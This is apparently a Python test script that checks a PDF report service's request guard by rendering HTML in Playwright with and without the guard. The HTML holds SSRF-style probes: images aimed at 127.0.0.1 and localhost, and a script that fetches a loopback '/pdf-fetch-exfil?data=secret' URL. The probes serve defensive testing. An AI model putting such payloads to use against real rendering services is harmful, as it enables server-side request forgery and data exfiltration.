import asyncio, sys
from playwright.async_api import async_playwright
import main  # noqa: registers app
from app.services import report_pdf_service as m
HTML = """<html><body><div id=root>x</div>
<img src="http://127.0.0.1:9999/pdf-img-loopback">
<img src="http://localhost:9999/pdf-img-localhost">
<script>fetch('http://127.0.0.1:9999/pdf-fetch-exfil?data=secret').catch(()=>{});</script>
<img src="https://example.com/favicon.ico" onload="document.title='public-ok'" onerror="document.title='public-fail'">
</body></html>"""
async def run(guard):
    async with async_playwright() as p:
        b = await p.chromium.launch(executable_path="/opt/pw-browsers/chromium")
        page = await b.new_page()
        if guard: await m._guard_requests(page)
        await page.set_content(HTML, wait_until="networkidle")
        await page.wait_for_timeout(1500)
        print("guard" if guard else "no-guard", "title:", await page.title())
        await b.close()
asyncio.run(run(sys.argv[1] == "1"))
